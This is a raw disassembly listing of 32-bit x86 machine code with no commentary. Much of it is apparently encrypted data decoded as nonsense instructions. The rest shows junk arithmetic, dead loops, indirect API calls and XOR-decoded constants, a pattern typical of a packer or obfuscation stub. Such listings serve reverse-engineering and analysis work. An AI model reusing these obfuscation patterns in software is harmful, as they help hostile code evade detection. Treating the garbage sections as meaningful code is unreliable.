  41bd01:	icebp  
  41bd02:	lock push ecx
  41bd04:	jb     0x41bcec
  41bd06:	call   0x6a50:0x57416c7a
  41bd0d:	call   0x56d7b369
  41bd12:	mov    al,ds:0x5a5da430
  41bd17:	ins    DWORD PTR es:[edi],dx
  41bd18:	cmp    BYTE PTR [ecx+0x6c],cl
  41bd1b:	cs jp  0x41bd3d
  41bd1e:	fadd   st,st(1)
  41bd20:	add    BYTE PTR [ebp+0x3397a488],ch
  41bd26:	pop    ss
  41bd27:	and    al,0xda
  41bd29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd2a:	adc    BYTE PTR [ebx-0x43],ch
  41bd2d:	lods   eax,DWORD PTR ds:[esi]
  41bd2e:	mov    ds:0xf86ab17a,eax
  41bd33:	sti    
  41bd34:	out    dx,eax
  41bd35:	push   esp
  41bd36:	inc    ebp
  41bd37:	jmp    0x41bcc6
  41bd39:	pop    edx
  41bd3a:	shr    BYTE PTR [ebx],0xab
  41bd3d:	loopne 0x41bd14
  41bd3f:	sahf   
  41bd40:	inc    eax
  41bd41:	jge    0x41bd16
  41bd43:	pop    edi
  41bd44:	jg     0x41bd73
  41bd46:	xchg   esp,eax
  41bd47:	and    bh,BYTE PTR [ecx-0x22]
  41bd4a:	dec    ebx
  41bd4c:	adc    al,BYTE PTR [ecx]
  41bd4e:	sbb    DWORD PTR [edx+0x31b660a2],0xf7bd5d9c
  41bd58:	mov    ds:0x10597e4b,eax
  41bd5d:	rcl    DWORD PTR [edx],cl
  41bd5f:	test   bh,ch
  41bd61:	fidiv  DWORD PTR [eax-0x13]
  41bd64:	or     DWORD PTR [ecx-0x6311b991],eax
  41bd6a:	into   
  41bd6b:	fstp   DWORD PTR [eax+0x5f]
  41bd6e:	mov    ds:0x99c2f8fe,eax
  41bd73:	or     eax,0xef58f8d3
  41bd78:	pop    ebx
  41bd79:	mov    eax,ds:0x1781a009
  41bd7e:	popf   
  41bd7f:	jnp    0x41bde6
  41bd81:	mov    eax,ds:0x192662f4
  41bd86:	sbb    eax,0x90941936
  41bd8b:	repnz leave 
  41bd8d:	inc    ecx
  41bd8e:	call   FWORD PTR [ebx-0x68]
  41bd91:	inc    esp
  41bd92:	dec    edx
  41bd93:	sbb    BYTE PTR [ebx+0x73a67a99],cl
  41bd99:	out    dx,eax
  41bd9a:	jns    0x41bd90
  41bd9c:	imul   ecx,DWORD PTR [edx-0x78],0x4d5dc726
  41bda3:	mov    WORD PTR [ebx],fs
  41bda5:	xor    ah,ah
  41bda7:	hlt    
  41bda8:	popf   
  41bda9:	stos   BYTE PTR es:[edi],al
  41bdaa:	mov    ch,0x76
  41bdac:	int    0xc0
  41bdae:	and    BYTE PTR [eax+0x2f],cl
  41bdb1:	jns    0x41bdf5
  41bdb3:	sahf   
  41bdb4:	add    al,0x64
  41bdb6:	ja     0x41bdbc
  41bdb8:	jmp    0x41be1c
  41bdba:	or     BYTE PTR [edx-0x5abefcce],bh
  41bdc0:	(bad)  
  41bdc1:	(bad)  
  41bdc2:	fmulp  st(7),st
  41bdc4:	inc    edx
  41bdc5:	icebp  
  41bdc6:	add    eax,0x6b51eaee
  41bdcb:	mov    ds:0x8059d1c7,eax
  41bdd0:	or     al,0x7c
  41bdd2:	jne    0x41bdb4
  41bdd4:	pop    ss
  41bdd5:	in     al,0x85
  41bdd7:	ins    BYTE PTR es:[edi],dx
  41bdd8:	dec    edx
  41bdd9:	fadd   st,st(5)
  41bddb:	sbb    esp,eax
  41bddd:	pop    ebx
  41bdde:	and    BYTE PTR [eax+0x3b],al
  41bde1:	cmp    al,0xca
  41bde3:	sbb    eax,0x2c7259f9
  41bde8:	lds    ebp,FWORD PTR [esi+0x3b6146d7]
  41bdee:	lods   eax,DWORD PTR ds:[esi]
  41bdef:	fisubr DWORD PTR [ecx-0x42]
  41bdf2:	sbb    BYTE PTR [ebp+eiz*4+0x75e0bf15],0x11
  41bdfa:	jns    0x41bde1
  41bdfc:	xor    al,0xe6
  41bdfe:	adc    ch,BYTE PTR [ecx+0x42796e2d]
  41be04:	mov    dl,ch
  41be06:	jnp    0x41be0c
  41be08:	enter  0x9e89,0xb3
  41be0c:	inc    esi
  41be0d:	xlat   BYTE PTR ds:[ebx]
  41be0e:	jecxz  0x41bdf0
  41be10:	clc    
  41be11:	cdq    
  41be12:	icebp  
  41be13:	xchg   edi,eax
  41be14:	push   ebx
  41be15:	inc    edi
  41be16:	xchg   DWORD PTR [ecx-0x74],ebx
  41be19:	adc    al,0xf0
  41be1b:	and    dh,BYTE PTR [edi-0x31fbaf90]
  41be21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be22:	fld    DWORD PTR [ecx]
  41be24:	outs   dx,DWORD PTR ds:[esi]
  41be25:	sub    eax,0x527e9c43
  41be2a:	dec    eax
  41be2b:	push   edx
  41be2c:	push   0xe84261b4
  41be31:	cmp    al,0xe5
  41be33:	stos   DWORD PTR es:[edi],eax
  41be34:	mov    ebp,0x85b5ffbe
  41be39:	xchg   ebx,eax
  41be3a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41be3c:	and    ebx,DWORD PTR [ebp+0x4c]
  41be3f:	pop    edx
  41be40:	enter  0x2c77,0x8f
  41be44:	pusha  
  41be45:	out    dx,eax
  41be46:	ret    0xfe5c
  41be49:	fdiv   QWORD PTR [bx+si+0x1fd2]
  41be4e:	hlt    
  41be4f:	pop    esi
  41be50:	shr    BYTE PTR [esi],1
  41be52:	cdq    
  41be53:	mov    gs,WORD PTR [ebp-0x7762cb17]
  41be59:	or     edi,esp
  41be5b:	nop
  41be5c:	je     0x41be12
  41be5e:	sub    BYTE PTR [esi-0x7417976b],0x31
  41be65:	xchg   ecx,eax
  41be66:	loope  0x41be1b
  41be68:	hlt    
  41be69:	mov    bh,0xa1
  41be6b:	jmp    0x47699630
  41be70:	neg    bl
  41be72:	test   eax,0xe75b3dd3
  41be78:	out    dx,al
  41be79:	je     0x41be6b
  41be7b:	sub    BYTE PTR [esi-0x63050ac9],ah
  41be81:	fisub  DWORD PTR [ecx+0x6d]
  41be84:	push   es
  41be85:	ins    DWORD PTR es:[edi],dx
  41be86:	cvtdq2ps xmm3,XMMWORD PTR [esi+0x64ff06b0]
  41be8d:	dec    ebp
  41be8e:	scas   al,BYTE PTR es:[edi]
  41be8f:	xor    DWORD PTR [esi-0x783baba1],esp
  41be95:	push   ds
  41be96:	mov    ebp,ebp
  41be98:	outs   dx,DWORD PTR ds:[esi]
  41be99:	loop   0x41bf00
  41be9b:	mov    al,0x33
  41be9d:	push   ecx
  41be9e:	ja     0x41be4f
  41bea0:	imul   edi,DWORD PTR ds:0xcc2cf501,0x63
  41bea7:	push   cs
  41bea8:	mov    DWORD PTR [esi-0x461aa477],edi
  41beae:	jns    0x41be89
  41beb0:	push   edi
  41beb1:	enter  0xc7be,0x84
  41beb5:	loopne 0x41be52
  41beb7:	leave  
  41beb8:	sbb    dl,BYTE PTR [ecx+0xe]
  41bebb:	pop    ds
  41bebc:	stos   BYTE PTR es:[edi],al
  41bebd:	loope  0x41be9e
  41bebf:	cmp    eax,0x86e230fd
  41bec4:	xlat   BYTE PTR ds:[ebx]
  41bec5:	mov    eax,ds:0x7e821125
  41beca:	test   esi,edx
  41becc:	rcl    DWORD PTR [edi],cl
  41bece:	fisttp QWORD PTR [ebx+edi*8+0x64]
  41bed2:	jle    0x41bf4d
  41bed4:	add    al,0x7e
  41bed6:	mov    dh,0x40
  41bed8:	in     eax,0x53
  41beda:	loope  0x41bf21
  41bedc:	adc    al,0x16
  41bede:	lock xchg ecx,eax
  41bee0:	sti    
  41bee1:	pop    ss
  41bee2:	mov    ebx,0x23f7549
  41bee7:	jnp    0x41bf4b
  41bee9:	jge    0x41be70
  41beeb:	pop    ecx
  41beec:	pop    ebp
  41beed:	test   al,0xc0
  41beef:	xor    eax,0x7132ae96
  41bef4:	and    BYTE PTR [edi-0xb],0xc3
  41bef8:	lds    ebx,FWORD PTR [ebx-0x53]
  41befb:	push   cs
  41befc:	aad    0xee
  41befe:	dec    edx
  41beff:	mov    ds:0xcc795b,al
  41bf04:	cs out 0xcb,eax
  41bf07:	icebp  
  41bf08:	icebp  
  41bf09:	or     BYTE PTR [edx-0x344ed316],bh
  41bf0f:	ja     0x41bf6d
  41bf11:	mov    ds:0x86b3178d,eax
  41bf16:	sub    eax,0xaba36f1
  41bf1b:	xchg   ebp,eax
  41bf1c:	adc    bl,cl
  41bf1e:	cs stos BYTE PTR es:[edi],al
  41bf20:	stos   DWORD PTR es:[edi],eax
  41bf21:	add    eax,0x9e14fdfa
  41bf26:	test   BYTE PTR [ebx],0xa2
  41bf29:	dec    edx
  41bf2a:	clc    
  41bf2b:	retf   0xb18
  41bf2e:	adc    al,0x46
  41bf30:	popa   
  41bf31:	(bad)  
  41bf32:	int3   
  41bf33:	(bad)  
  41bf34:	popa   
  41bf35:	shl    DWORD PTR ds:0xfda252b1,cl
  41bf3b:	test   BYTE PTR [eax],ah
  41bf3d:	mov    esp,0x236b2d4e
  41bf42:	(bad)  
  41bf45:	cwde   
  41bf46:	xor    al,0x33
  41bf48:	lahf   
  41bf49:	ficomp DWORD PTR [edi-0x486bc016]
  41bf4f:	or     eax,0x50c77847
  41bf54:	out    dx,eax
  41bf55:	mov    dh,0x3e
  41bf57:	push   0x505c61d3
  41bf5c:	lahf   
  41bf5d:	adc    cl,BYTE PTR [ecx+0x38]
  41bf60:	or     dl,BYTE PTR [edi]
  41bf62:	out    0x2e,eax
  41bf64:	loop   0x41bf90
  41bf66:	cmp    DWORD PTR [edx-0x7d5b5632],edi
  41bf6c:	call   0x7449:0x99996e02
  41bf73:	loope  0x41bf48
  41bf75:	jae    0x41bf64
  41bf77:	mov    ds:0xb8575df1,al
  41bf7c:	mov    al,ds:0x4d79f6d0
  41bf81:	pop    ebx
  41bf82:	aas    
  41bf83:	dec    edx
  41bf84:	mov    esi,0xc796e770
  41bf89:	inc    ecx
  41bf8a:	hlt    
  41bf8b:	dec    esi
  41bf8c:	bound  esp,QWORD PTR [edx]
  41bf8e:	or     ebx,ebx
  41bf90:	lods   al,BYTE PTR ds:[esi]
  41bf91:	stc    
  41bf92:	mov    eax,0x4aa943c3
  41bf97:	pop    es
  41bf98:	mov    al,ds:0x9baca050
  41bf9d:	sub    edi,eax
  41bf9f:	xor    ch,bl
  41bfa1:	mov    ah,0x93
  41bfa3:	add    dh,BYTE PTR [eax-0x3c5c54ef]
  41bfa9:	push   edi
  41bfaa:	imul   esi,DWORD PTR [edi-0x3e2dab2c],0xfe2d6bc0
  41bfb4:	pop    edx
  41bfb5:	mov    esi,0x12e64c95
  41bfba:	iret   
  41bfbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfbc:	es jno 0x41bf4b
  41bfbf:	mov    ecx,0xbfbdd60d
  41bfc4:	imul   edi,DWORD PTR [eax+0x22],0x5f
  41bfc8:	int    0x97
  41bfca:	xor    bl,0xad
  41bfcd:	imul   esp,DWORD PTR [edi-0x79],0xb0a5e8d5
  41bfd4:	adc    dl,BYTE PTR ds:0xc9896ca2
  41bfda:	xchg   edx,eax
  41bfdb:	call   0x64e7e088
  41bfe0:	add    bh,cl
  41bfe2:	fbstp  TBYTE PTR [esi]
  41bfe4:	push   0xffffff88
  41bfe6:	jb     0x41c04e
  41bfe8:	cmp    ebp,esi
  41bfea:	push   ss
  41bfeb:	adc    DWORD PTR [edx],eax
  41bfed:	fsub   st,st(3)
  41bfef:	mov    esi,edi
  41bff1:	adc    al,0xd7
  41bff3:	out    dx,al
  41bff4:	ret    0xb0c3
  41bff7:	js     0x41c046
  41bff9:	or     DWORD PTR [edi-0xbbc3510],eax
  41bfff:	mov    WORD PTR [esi-0x58],?
  41c002:	retf   0xe47c
  41c005:	std    
  41c006:	jns    0x41bfb6
  41c008:	sbb    esi,edi
  41c00a:	pop    esp
  41c00b:	sub    al,0xda
  41c00d:	in     eax,dx
  41c00e:	shl    DWORD PTR [ebp+0x65],0xb
  41c012:	lods   eax,DWORD PTR ds:[esi]
  41c013:	lahf   
  41c014:	inc    esi
  41c015:	mov    al,ds:0x7c16ceb
  41c01a:	fwait
  41c01b:	lock (bad) 
  41c01d:	xor    cl,dl
  41c01f:	sahf   
  41c020:	shl    DWORD PTR ds:0x628f0df7,1
  41c026:	jbe    0x41bfee
  41c028:	sbb    BYTE PTR [esi],al
  41c02a:	sub    eax,0xe30f69c2
  41c02f:	imul   edx,DWORD PTR [ebx+0x5c],0x38
  41c033:	and    esp,DWORD PTR [ebp-0x3c]
  41c036:	xchg   esp,eax
  41c037:	mov    edx,esp
  41c039:	inc    ebx
  41c03a:	mov    WORD PTR [eax],es
  41c03c:	sahf   
  41c03d:	jg     0x41c089
  41c03f:	imul   ecx,DWORD PTR [ebx+ebx*8-0x19],0xffffffb7
  41c044:	ss loop 0x41bfc7
  41c047:	dec    esi
  41c048:	xchg   BYTE PTR [ebx-0x2a],bl
  41c04b:	(bad)  
  41c04c:	fcmovnu st,st(7)
  41c04e:	data16 xchg bl,ch
  41c051:	rol    dh,0x55
  41c054:	adc    esp,eax
  41c056:	mov    cl,0xc7
  41c058:	push   ebx
  41c059:	mov    ds:0x693ca2f7,al
  41c05e:	leave  
  41c05f:	mov    edi,DWORD PTR [eax+eax*8+0x4c]
  41c063:	jecxz  0x41c0ac
  41c065:	pop    es
  41c066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c067:	push   ebx
  41c068:	dec    ebp
  41c06a:	aam    0xd0
  41c06c:	fld    DWORD PTR [ebp+0x77440d9f]
  41c072:	pop    eax
  41c073:	mov    al,ds:0xf1ee503c
  41c078:	or     DWORD PTR [edi],eax
  41c07a:	popf   
  41c07b:	out    0x70,al
  41c07d:	(bad)  
  41c07e:	mov    WORD PTR [edx],fs
  41c080:	cdq    
  41c081:	ss loop 0x41c0ec
  41c084:	or     al,0x9c
  41c086:	cmp    eax,0x50c53c92
  41c08b:	div    BYTE PTR [ebp-0x63226e69]
  41c091:	mov    ebp,0xcc19477e
  41c096:	xchg   edx,eax
  41c097:	not    bl
  41c099:	addr16 mov ch,0x5f
  41c09c:	xor    cl,bl
  41c09e:	das    
  41c09f:	cmp    al,0x35
  41c0a1:	dec    edi
  41c0a2:	mov    eax,ds:0xe4c6e0f9
  41c0a7:	div    edx
  41c0a9:	dec    edx
  41c0aa:	arpl   WORD PTR [eax-0x35],di
  41c0ad:	loopne 0x41c085
  41c0af:	mov    ebx,0x53107839
  41c0b4:	dec    esp
  41c0b5:	(bad)  
  41c0b6:	xchg   edi,eax
  41c0b7:	mov    cl,0xd
  41c0b9:	mov    ds:0x5bbb0a25,eax
  41c0be:	test   eax,0xf66682d7
  41c0c4:	scas   eax,DWORD PTR es:[edi]
  41c0c5:	cmc    
  41c0c6:	push   0xdb3c4b67
  41c0cb:	sahf   
  41c0cc:	int    0x8a
  41c0ce:	and    BYTE PTR [ebx+0x616c338f],dl
  41c0d4:	pop    ecx
  41c0d5:	xchg   edx,eax
  41c0d6:	test   eax,0x8d320d2d
  41c0db:	mov    ebx,0x124cbbff
  41c0e0:	or     eax,0xbfe72482
  41c0e5:	das    
  41c0e6:	and    BYTE PTR [edi+0x29],bl
  41c0e9:	inc    esp
  41c0ea:	outs   dx,DWORD PTR ds:[esi]
  41c0eb:	icebp  
  41c0ec:	cmp    cl,BYTE PTR [edx]
  41c0ee:	sbb    eax,0xc4e569be
  41c0f3:	push   cs
  41c0f4:	(bad)  
  41c0f5:	ins    DWORD PTR es:[edi],dx
  41c0f6:	scas   eax,DWORD PTR es:[edi]
  41c0f7:	or     edi,DWORD PTR [ecx+0x309778c1]
  41c0fd:	add    BYTE PTR [ebx-0x5fc17b3],cl
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428cf5
  41c331:	mov    ebx,DWORD PTR ds:0x42af49
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
